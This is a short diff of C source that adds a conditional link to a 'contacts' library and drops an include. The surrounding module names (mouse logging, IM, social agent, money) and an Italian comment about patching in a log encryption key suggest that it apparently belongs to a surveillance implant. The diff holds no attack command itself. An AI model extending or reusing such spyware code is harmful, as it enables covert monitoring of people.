@@ -92,6 +92,10 @@ void PM_MoneyRegister();
 #pragma comment(lib, "messages")
 #endif
 
+#ifdef __ENABLE_CONTACTS_MODULE
+#pragma comment(lib, "contacts")
+#endif
+
 /// SECTION for building modules
 
 #include <json/JSON.h>
@@ -112,7 +116,7 @@ extern void PM_IMRegister();	// defined in /modules/imagent
 
 #include "HM_MouseLog.h" // XXX da modificare
 #include "HM_Application.h" // XXX da modificare
-#include "HM_Contacts.h" // XXX da modificare
+
 void PM_SocialAgentRegister();
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
